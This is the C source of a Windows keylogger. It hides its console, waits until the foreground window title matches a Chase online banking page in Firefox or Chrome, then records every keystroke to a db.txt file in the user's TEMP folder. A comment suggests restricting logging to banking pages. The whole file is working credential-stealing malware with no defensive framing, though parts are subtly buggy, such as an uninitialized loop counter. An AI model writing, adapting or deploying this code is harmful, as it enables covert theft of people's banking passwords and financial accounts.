#include <windows.h>
#include <stdio.h>
#include <tchar.h>

//can be improved: log only when bank titles appear and stop logging once title isn't equal to anything banking related

int gen(int key_stroke, char *file);

int main() {
	const CHAR * banktitles[] = {"Credit Card, Mortgage, Banking, Auto | Chase Online | Chase.com - Mozilla Firefox", "Credit Card, Mortgage, Banking, Auto | Chase Online | Chase.com - Google Chrome"};
	TCHAR windowtitle[MAX_PATH];
	AllocConsole();
	HWND win = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(win, 0);
	//can also be done with do; while loop
	for (int z; z < 2; z++) {
		while (lstrcmpiA(windowtitle, banktitles[z]) != 0) {
			HWND workingwindow = GetForegroundWindow();
			GetWindowText(workingwindow, windowtitle, MAX_PATH);
			printf("Sleeping...\n");
			Sleep(100000);
			if (lstrcmpiA(windowtitle, banktitles[z]) == 0) {
				goto out;
			}
			else {
				continue;
			}
		}
	}
	out:printf("window matched!\n");
	printf("Keylogger started...\n");
	TCHAR dbpath[MAX_PATH];
	GetEnvironmentVariable("TEMP", dbpath, MAX_PATH);
	strcat_s(dbpath, strlen(dbpath)+strlen("\\db.txt")+1, "\\db.txt");
	char i;
	while (1) {
		for (i=8; i<=190; i++) {
			if (GetAsyncKeyState(i) == -32767)
				gen(i, dbpath);
		}	
	}
	//system("PAUSE");

}

int gen (int key_stroke, char *file) {
    if ((key_stroke == 1) || (key_stroke == 2))
        return 0;

    FILE * OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");


    if (key_stroke == 8)
        fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
    else if (key_stroke == 13)
        fprintf(OUTPUT_FILE, "%s", "\n");
    else if (key_stroke == 32)
        fprintf(OUTPUT_FILE, "%s", " ");
    else if (key_stroke == VK_TAB)
        fprintf(OUTPUT_FILE, "%s", "[TAB]");
    else if (key_stroke == VK_SHIFT)
        fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
    else if (key_stroke == VK_CONTROL)
        fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
    else if (key_stroke == VK_ESCAPE)
        fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
    else if (key_stroke == VK_END)
        fprintf(OUTPUT_FILE, "%s", "[END]");
    else if (key_stroke == VK_HOME)
        fprintf(OUTPUT_FILE, "%s", "[HOME]");
    else if (key_stroke == VK_LEFT)
        fprintf(OUTPUT_FILE, "%s", "[LEFT]");
    else if (key_stroke == VK_UP)
        fprintf(OUTPUT_FILE, "%s", "[UP]");
    else if (key_stroke == VK_RIGHT)
        fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
    else if (key_stroke == VK_DOWN)
        fprintf(OUTPUT_FILE, "%s", "[DOWN]");
    else if (key_stroke == 190 || key_stroke == 110)
        fprintf(OUTPUT_FILE, "%s", ".");
    else
        fprintf (OUTPUT_FILE, "%s", &key_stroke);

    fclose(OUTPUT_FILE);
    return 0;
}
